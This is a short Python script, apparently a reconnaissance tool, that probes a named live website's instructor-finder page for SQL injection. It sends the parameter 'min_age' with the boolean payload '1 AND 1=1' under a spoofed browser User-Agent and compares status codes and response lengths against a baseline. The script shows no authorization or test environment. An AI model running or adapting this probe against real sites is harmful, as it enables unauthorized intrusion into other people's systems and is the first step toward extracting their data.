import requests

TARGET = "https://learnyway.com/instructor-finder"

HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
}

def test():
    print(f"[*] Testing {TARGET}")
    r = requests.get(TARGET, headers=HEADERS, timeout=15)
    print(f"Status: {r.status_code}")
    print(f"Length: {len(r.text)}")
    
    # Test a simple harmless injection
    print("\n[*] Testing with harmless param: min_age=1")
    r2 = requests.get(TARGET, params={"min_age": "1"}, headers=HEADERS, timeout=15)
    print(f"Status: {r2.status_code}")
    print(f"Length: {len(r2.text)}")

    print("\n[*] Testing with SQLi check: min_age=1 AND 1=1")
    r3 = requests.get(TARGET, params={"min_age": "1 AND 1=1"}, headers=HEADERS, timeout=15)
    print(f"Status: {r3.status_code}")
    print(f"Length: {len(r3.text)}")

if __name__ == "__main__":
    test()
